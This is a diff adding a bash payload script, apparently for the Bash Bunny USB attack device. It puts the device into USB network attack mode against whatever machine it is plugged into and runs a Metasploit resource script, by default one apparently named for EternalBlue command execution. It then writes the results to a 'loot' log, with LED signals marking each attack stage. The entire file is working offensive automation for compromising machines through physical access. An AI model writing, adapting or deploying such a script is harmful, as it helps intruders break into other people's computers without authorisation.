@@ -1,0 +1,91 @@
+#!/bin/bash
+#
+# Title:         Autosploit for Bash Bunny
+# Author:        PunkLobster
+# Version:       0.1
+#
+# Starts Metasploit Script.
+# Wraps the Metasploit script to send output to the loot log fie.
+# Also adds a 'quit' to the end so the blocking call can end and allow us to change the LED.
+#
+# Red ...........Setup
+# # Red Blinking...Setup Failed. Target did not obtain IP address. Exit.
+# Amber..........Running
+# # White..........Switching to Mass Storage (optional)
+# Green..........Finished
+#
+
+# Change this for the desired Metasploit script
+RC=/root/udisk/payloads/$SWITCH_POSITION/eternal-cmd.rc
+
+# Start the timer for the log file (can't rely on absolute system time, so relative from script start)
+START_TIME=$SECONDS
+LOOTDIR=/root/udisk/loot/autosploit
+# location of the patched script 
+PATCHED_RC=$LOOTDIR/patched.rc
+
+
+
+######## INITIALIZATION ########
+LED SETUP 
+# Use RNDIS for Windows. Mac/*nix use ECM_ETHERNET
+#ATTACKMODE RNDIS_ETHERNET 
+ATTACKMODE ECM_ETHERNET
+GET TARGET_HOSTNAME
+
+
+
+######## MAKE LOOT DIRECTORY ########
+# Setup named logs in loot directory
+mkdir -p $LOOTDIR
+HOST=${TARGET_HOSTNAME}
+# If hostname is blank set it to "noname"
+[[ -z "$HOST" ]] && HOST="noname"
+COUNT=$(ls -lad $LOOTDIR/$HOST*.log | wc -l)
+COUNT=$((COUNT+1))
+
+
+
+######## SET UP LOGGING ########
+# Time Delta doesn't currently work
+function logit {
+	TIME_DELTA=$(($SECONDS - $START_TIME))
+	echo "${TIME_DELTA}s: ${1}" >> $LOGFILE
+}
+LOGFILE=$LOOTDIR/$HOST-$COUNT.log
+
+
+
+######## PATCH RC FILE FOR LOGGING ########
+echo "spool $LOGFILE" > $PATCHED_RC
+cat $RC >> $PATCHED_RC
+echo "spool off" >> $PATCHED_RC
+echo "quit" >> $PATCHED_RC
+
+
+
+######## PREPARE rvm ########
+logit "Initializing rvm"
+export HOME=/root/
+source /root/.bashrc
+
+
+
+######## ATTACK ########
+LED ATTACK
+logit "Starting"
+/root/metasploit-framework/msfconsole -r $PATCHED_RC
+# if script isn't running, use the redirection below to see msfconsole errors (will duplicate successful script line output though)
+# >> $LOGFILE 2>&1
+logit "Finishing"
+
+
+
+######## CLEANUP ########
+LED CLEANUP
+sync
+
+
+
+######## FINISH ########
+LED FINISH
